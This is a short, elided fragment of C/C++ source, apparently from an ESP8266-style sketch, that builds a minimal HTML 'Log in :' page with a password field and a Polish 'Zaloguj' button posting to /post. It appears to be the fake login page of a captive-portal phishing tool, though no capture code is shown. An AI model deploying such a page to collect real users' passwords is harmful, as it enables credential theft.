...
#define SUBTITLE "Add Your text" //  
#define TITLE "Log in :" //
#define BODY "Add Your text" //
#define POST_TITLE "Add Your text"
#define POST_BODY " Add Your text" //
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    ...
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Zaloguj\"></form></center>" + footer();
